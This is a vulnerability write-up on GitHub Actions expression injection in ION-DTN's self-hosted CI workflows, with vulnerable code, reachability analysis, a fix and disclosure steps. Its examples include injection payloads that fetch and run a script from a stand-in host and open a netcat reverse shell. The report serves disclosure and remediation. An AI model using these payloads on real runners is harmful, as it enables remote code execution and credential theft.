# NASA-WF-001 — ION-DTN: expression injection on self-hosted CI runners

**Repo:** https://github.com/nasa-jpl/ION-DTN
**Affected workflows:** 15 (the `ci-workflow-*.yml` family — ubuntu20/22, rhel8/9, ol8/9, fedora42, debiantrixie/bookworm, freeBSD14, macos_arm64, rpios, solaris, rtems61-aarch64-libbsd, plus `ci-workflow-atomic-tiers.yml`)
**Severity:** High (impact-weighted) / reachability needs caller graph confirmation
**Class:** CWE-94 (Improper Control of Generation of Code) via GitHub Actions expression injection; CWE-78 (OS Command Injection)

## Where

Example, `ION-DTN/.github/workflows/ci-workflow-ubuntu22.yml` (default branch `integration`, head at audit time):

```yaml
55:  build-and-test:
56:    runs-on: [self-hosted, linux, x64, ubuntu22]
...
82:      - name: Run build and tests, capture stdout
...
100:            if [ -n "${{ github.event.inputs.env_vars }}" ]; then
101:              echo "Setting environment variables: ${{ github.event.inputs.env_vars }}"
102:              for env_var in ${{ github.event.inputs.env_vars }}; do
103:                export "$env_var"
104:              done
105:            fi
106:            if [ "${{ github.event_name }}" = "workflow_dispatch" ] && [ -n "${{ github.event.inputs.tests_to_run }}" ]; then
107:              echo "Running specific tests: ${{ github.event.inputs.tests_to_run }}"
108:              ./runtests ${{ github.event.inputs.tests_to_run }}
...
184:        uses: actions/github-script@v9
185:        with:
186:          script: |
187:            const conclusion = "${{ job.status }}" === "success" ? "success" : "failure";
188:            const prNumber = parseInt("${{ inputs.pr_number }}", 10);
```

The same pattern repeats in `ci-workflow-rhel8.yml`, `ci-workflow-rhel9.yml`, `ci-workflow-ol8.yml`, `ci-workflow-ol9.yml`, `ci-workflow-fedora42.yml`, `ci-workflow-debianbookworm.yml`, `ci-workflow-debiantrixie.yml`, `ci-workflow-ubuntu20.yml`, `ci-workflow-rpios.yml`, `ci-workflow-macos_arm64.yml`, `ci-workflow-freeBSD14.yml`, `ci-workflow-solaris.yml`, `ci-workflow-rtems61-aarch64-libbsd.yml`.

## Why it's a bug

Two distinct injection sinks in each affected file:

### Shell injection (lines 100–108)

`${{ github.event.inputs.env_vars }}` and `${{ github.event.inputs.tests_to_run }}` are interpolated **raw** into a `run:` bash block. The most dangerous spots:

- `for env_var in ${{ github.event.inputs.env_vars }}; do` — unquoted in a for-loop expansion. Input value `foo; curl evil.example/x.sh | sh; #` ends up as `for env_var in foo; curl evil.example/x.sh | sh; #; do` → arbitrary shell.
- `./runtests ${{ github.event.inputs.tests_to_run }}` — unquoted arg list. Same class of injection.
- The `[ -n "..." ]` test is double-quoted, but the value is *also* echoed unquoted on line 101 (`echo "Setting ... : ${{ github.event.inputs.env_vars }}"`), which means a value containing `"; cmd; #` breaks out of the surrounding double-quote string.

GitHub's own documentation calls this out:
> Warning: When creating workflows ... use an environment variable to assign untrusted input data to a job. Never inline `${{ }}` expressions into a `run:` script.

### JavaScript injection (lines 187–188)

```yaml
script: |
  const conclusion = "${{ job.status }}" === "success" ? "success" : "failure";
  const prNumber = parseInt("${{ inputs.pr_number }}", 10);
```

`${{ inputs.pr_number }}` is declared `type: string` and inlined into a JS string literal **before** `parseInt`. A value like `"); require("child_process").exec("nc attacker 4444 -e /bin/sh"); //` closes the string and executes arbitrary JS inside the `github-script` action — which already has the workflow's `GITHUB_TOKEN`.

### Why "self-hosted" makes it worse

`runs-on: [self-hosted, linux, x64, ubuntu22]` (and analogous on each platform variant) → the injected commands execute on a **persistent JPL-controlled runner**, not on a one-shot GitHub-hosted VM. Consequences:

- Tampering with subsequent runs (e.g., poisoning build caches, planting artifacts).
- Lateral movement within the runner host's network (which may have access to internal JPL CI infrastructure).
- Theft of any credentials present on the host (CI tokens, deploy keys, SSH agents).
- Persistence (the runner doesn't reset between jobs unless explicitly cleaned).

## Reachability (attacker's path to triggering this)

Inputs come from two trigger types:

1. **`workflow_dispatch`** — only callable by users with `write` permission on the repo. **Not directly exploitable** by an unauthenticated external attacker, but an insider with write access could weaponize it.
2. **`workflow_call`** — i.e., this reusable workflow is invoked by another workflow. The dangerous case is if the calling workflow takes input from a `pull_request` (fork) event and forwards it.

I traced `ci-workflow-atomic-tiers.yml` (the orchestrator) — it pulls its own inputs from `workflow_dispatch` (write-only) or `schedule` (cron, hardcoded). **At first glance the orchestrator does not forward `pull_request` fork data**, so external exploitability is currently *not confirmed*. The vulnerability is latent: the day someone adds a `pull_request` or `issue_comment` trigger to a caller and wires the body through `env_vars`/`tests_to_run`, it becomes a remote pre-auth CI takeover.

## Recommended fix

Pass any untrusted string through an env-var, then reference `$ENV_NAME` (quoted) in the shell:

```yaml
- name: Run build and tests, capture stdout
  env:
    ENV_VARS: ${{ github.event.inputs.env_vars }}
    TESTS_TO_RUN: ${{ github.event.inputs.tests_to_run }}
  run: |
    if [ -n "$ENV_VARS" ]; then
      echo "Setting environment variables: $ENV_VARS"
      for env_var in $ENV_VARS; do          # if word-splitting is intended, leave unquoted but the source is now an env var, not raw template
        export "$env_var"
      done
    fi
    if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ] && [ -n "$TESTS_TO_RUN" ]; then
      ./runtests $TESTS_TO_RUN              # consider an array if quoting needed
    fi
```

For the `github-script` block:

```yaml
- uses: actions/github-script@v9
  env:
    PR_NUMBER: ${{ inputs.pr_number }}
  with:
    script: |
      const prNumber = parseInt(process.env.PR_NUMBER || "", 10);
      const conclusion = process.env.JOB_STATUS === "success" ? "success" : "failure";
```

(Also pin `actions/github-script` and `actions/checkout` and `actions/upload-artifact` to commit SHAs — the current `@v9` / `@v7` references are mutable.)

## Reporting

This is exactly the kind of finding NASA's VDP wants. Submit at https://bugcrowd.com/nasa-vdp with:
- Repo URL + commit SHA at audit time
- File paths and line numbers above
- A note that reachability from external attackers depends on the caller graph and you have not validated exploitation in a live environment (per VDP rules).
